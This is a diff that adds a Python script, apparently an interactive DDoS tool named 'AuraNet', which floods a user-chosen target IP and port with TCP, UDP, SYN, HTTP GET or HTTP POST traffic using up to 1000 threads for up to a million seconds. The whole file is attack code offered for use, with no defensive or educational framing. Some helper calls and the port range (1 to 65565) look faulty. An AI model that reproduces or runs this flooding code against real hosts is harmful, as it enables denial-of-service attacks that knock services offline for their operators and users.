@@ -1,0 +1,211 @@
+import bane, sys, socket, time
+from concurrent.futures import ThreadPoolExecutor
+
+if sys.version_info < (3, 0):
+    input = raw_input
+
+# Helper functions to get inputs from the user
+def get_user_input(prompt, valid_condition, error_message):
+    while True:
+        try:
+            value = input(prompt)
+            if valid_condition(value):
+                return value
+        except:
+            pass
+        print(error_message)
+
+def get_numeric_input(prompt, min_value, max_value):
+    return int(get_user_input(
+        prompt,
+        lambda x: min_value <= int(x) <= max_value,
+        f"Please enter a valid choice between {min_value} and {max_value}.."
+    ))
+
+def get_choice_input(prompt, choices):
+    return get_user_input(
+        prompt,
+        lambda x: x.lower() in choices,
+        f"Please enter a valid choice: {', '.join(choices)}.."
+    ).lower()
+
+# Welcome menu
+def welcome_menu():
+    print(bane.Fore.YELLOW + "\nWelcome to AuraNet: The Most Powerful DDoS Tool Owned by YG and Mr.Aura!" + bane.Fore.RESET)
+    print("\nDo you want to perform a DDoS attack?")
+    choice = get_choice_input(bane.Fore.GREEN + "\nType 'yes' or 'no': " + bane.Fore.WHITE, ['yes', 'no'])
+    if choice == 'yes':
+        return True
+    else:
+        print(bane.Fore.RED + "\nExiting... Goodbye!" + bane.Fore.RESET)
+        sys.exit()
+
+# Select Layer (4 or 7)
+def select_layer():
+    print(bane.Fore.CYAN + "\nSelect DDoS Layer:" + bane.Fore.RESET)
+    print("\t1- Layer 4 (Transport Layer)")
+    print("\t2- Layer 7 (Application Layer)")
+    layer = get_numeric_input(bane.Fore.GREEN + "Select a layer (1-2): " + bane.Fore.WHITE, 1, 2)
+    return layer
+
+# Layer 4 Attack Method Menu
+def select_layer4_method():
+    print(bane.Fore.CYAN + "\nLayer 4 Attack Methods:" + bane.Fore.RESET)
+    print("\t1- TCP Flood")
+    print("\t2- UDP Flood")
+    print("\t3- SYN Flood")
+    method = get_numeric_input(bane.Fore.GREEN + "Select a method (1-3): " + bane.Fore.WHITE, 1, 3)
+    return method
+
+# Layer 7 Attack Method Menu
+def select_layer7_method():
+    print(bane.Fore.CYAN + "\nLayer 7 Attack Methods:" + bane.Fore.RESET)
+    print("\t1- HTTP Flood")
+    print("\t2- HTTP POST Flood")
+    method = get_numeric_input(bane.Fore.GREEN + "Select a method (1-2): " + bane.Fore.WHITE, 1, 2)
+    return method
+
+# Get target IP
+def get_target_ip():
+    return get_user_input(
+        bane.Fore.GREEN + '\nEnter Target IP address: ' + bane.Fore.WHITE,
+        lambda x: socket.gethostbyname(x),
+        bane.Fore.RED + 'Please enter a valid IP address.' + bane.Fore.WHITE
+    )
+
+# Get target port
+def get_target_port():
+    return get_numeric_input(
+        bane.Fore.GREEN + '\nEnter Target Port (number between 1 - 65565) : ' + bane.Fore.WHITE,
+        1, 65565
+    )
+
+# Get thread count
+def get_threads_count():
+    return get_numeric_input(
+        bane.Fore.GREEN + '\nEnter number of threads (1 - 1000) : ' + bane.Fore.WHITE,
+        1, 1000
+    )
+
+# Get timeout value
+def get_timeout():
+    return get_numeric_input(
+        bane.Fore.GREEN + '\nEnter Timeout (number between 1 - 30) : ' + bane.Fore.WHITE,
+        1, 30
+    )
+
+# Get attack duration
+def get_duration():
+    return get_numeric_input(
+        bane.Fore.GREEN + '\nEnter attack duration in seconds (number between 1 - 1000000) : ' + bane.Fore.WHITE,
+        1, 1000000
+    )
+
+# Layer 4 Attack Functions
+def perform_layer4_attack(target_ip, target_port, threads_count, timeout, duration, method):
+    # TCP Flood attack
+    def tcp_flood(target_ip, target_port, duration):
+        timeout = time.time() + duration
+        while time.time() < timeout:
+            try:
+                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                client.connect((target_ip, target_port))
+                client.send(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % target_ip.encode())
+                client.close()
+            except:
+                pass
+
+    # UDP Flood attack
+    def udp_flood(target_ip, target_port, duration):
+        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        payload = bane.generate_payload(1024)
+        timeout = time.time() + duration
+        while time.time() < timeout:
+            client.sendto(payload, (target_ip, target_port))
+
+    # SYN Flood attack
+    def syn_flood(target_ip, target_port, duration):
+        client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+        client.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        timeout = time.time() + duration
+        while time.time() < timeout:
+            ip_header = bane.create_ip_header(target_ip)
+            tcp_header = bane.create_tcp_header(target_ip, target_port)
+            packet = ip_header + tcp_header
+            client.sendto(packet, (target_ip, 0))
+
+    # Execute selected attack
+    if method == 1:
+        with ThreadPoolExecutor(max_workers=threads_count) as executor:
+            for _ in range(threads_count):
+                executor.submit(tcp_flood, target_ip, target_port, duration)
+    elif method == 2:
+        with ThreadPoolExecutor(max_workers=threads_count) as executor:
+            for _ in range(threads_count):
+                executor.submit(udp_flood, target_ip, target_port, duration)
+    elif method == 3:
+        with ThreadPoolExecutor(max_workers=threads_count) as executor:
+            for _ in range(threads_count):
+                executor.submit(syn_flood, target_ip, target_port, duration)
+
+# Layer 7 Attack Functions
+def perform_layer7_attack(target_ip, threads_count, timeout, duration, method):
+    # HTTP Flood attack
+    def http_flood(target_ip, duration):
+        timeout = time.time() + duration
+        while time.time() < timeout:
+            try:
+                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                client.connect((target_ip, 80))
+                client.send(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % target_ip.encode())
+                client.close()
+            except:
+                pass
+
+    # HTTP POST Flood attack
+    def http_post_flood(target_ip, duration):
+        timeout = time.time() + duration
+        while time.time() < timeout:
+            try:
+                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                client.connect((target_ip, 80))
+                client.send(b"POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 1000\r\n\r\n" % target_ip.encode())
+                client.close()
+            except:
+                pass
+
+    # Execute selected attack
+    if method == 1:
+        with ThreadPoolExecutor(max_workers=threads_count) as executor:
+            for _ in range(threads_count):
+                executor.submit(http_flood, target_ip, duration)
+    elif method == 2:
+        with ThreadPoolExecutor(max_workers=threads_count) as executor:
+            for _ in range(threads_count):
+                executor.submit(http_post_flood, target_ip, duration)
+
+# Main function to run the tool
+def main():
+    if welcome_menu():
+        layer = select_layer()
+
+        # Get target details
+        target_ip = get_target_ip()
+        target_port = get_target_port() if layer == 1 else None
+        threads_count = get_threads_count()
+        timeout = get_timeout()
+        duration = get_duration()
+
+        # Perform Layer 4 attack
+        if layer == 1:
+            method = select_layer4_method()
+            perform_layer4_attack(target_ip, target_port, threads_count, timeout, duration, method)
+
+        # Perform Layer 7 attack
+        elif layer == 2:
+            method = select_layer7_method()
+            perform_layer7_attack(target_ip, threads_count, timeout, duration, method)
+
+# Run the tool
+if __name__ == "__main__":
+    main()
